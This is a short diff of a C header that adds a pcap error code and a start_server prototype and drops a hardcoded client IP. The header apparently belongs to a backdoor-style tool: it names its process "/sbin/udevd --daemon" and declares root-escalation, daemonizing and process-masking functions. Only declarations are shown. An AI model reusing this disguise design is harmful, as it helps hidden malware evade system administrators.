@@ -35,17 +35,16 @@
 #define ERROR_OPTS		-3
 #define	ERROR_OPTS_HELP	-4
 #define ERROR_FORK		-5
+#define ERROR_PCAP		-6
 
 /* defaults */
 #define	TRUE			1
 #define FALSE			0
 #define USER_ROOT		0
 #define PROCESS_NAME 	"/sbin/udevd --daemon"
-#define CLIENT_IP		"192.168.1.100"
 
 struct svr_vars {
 	int daemonize;
-	char *client_ip;
 } svr_vars;
 
 /* function prototypes */
@@ -57,5 +56,6 @@ void exit_clean(void);
 void daemonize(void);
 int set_root(void);
 void mask_process(char **, char *);
+void start_server(void);
 
 #endif
